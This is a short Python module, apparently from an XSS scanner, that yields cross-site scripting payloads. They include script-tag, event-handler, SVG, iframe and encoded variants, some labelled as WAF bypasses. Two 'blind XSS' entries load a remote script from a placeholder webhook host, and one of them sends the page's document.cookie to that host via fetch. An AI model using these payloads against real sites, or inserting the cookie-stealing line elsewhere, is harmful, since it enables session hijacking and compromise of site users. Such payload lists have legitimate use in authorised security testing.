# core/payloads.py placeholder

# core/payloads.py

def generate():
    """Yield multiple XSS payloads including basic, encoded, and WAF bypass types."""
    payload_list = [
        '<script>alert(1)</script>',                    # Basic
        '"><script>alert(1)</script>',                  # Attribute break
        "';alert(1);//",                                # JS injection
        "<img src=x onerror=alert(1)>",                 # Image handler
        "<svg/onload=alert(1)>",                        # SVG trick
        "<body onload=alert(1)>",                       # Body tag
        "<iframe src='javascript:alert(1)'></iframe>",  # iframe injection
        "<script>confirm(1)</script>",                  # confirm()
        "<script>prompt(1)</script>",                   # prompt()
        "<math><mtext></mtext><script>alert(1)</script></math>",  # MathML
        "<object data='javascript:alert(1)'></object>", # Object tag
        "<link rel=stylesheet href=javascript:alert(1)>", # CSS based
        "<video><source onerror=\"alert(1)\"></video>", # Media tag
        # Blind XSS payloads
        "<script src='https://your-webhook-domain.com/x.js'></script>",  
        "<img src='x' onerror='fetch(\"https://your-webhook-domain.com?c=\"+document.cookie)'>",
        # Encoded payloads
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&lt;script&gt;alert(1)&lt;/script&gt;"
    ]

    for payload in payload_list:
        yield payload

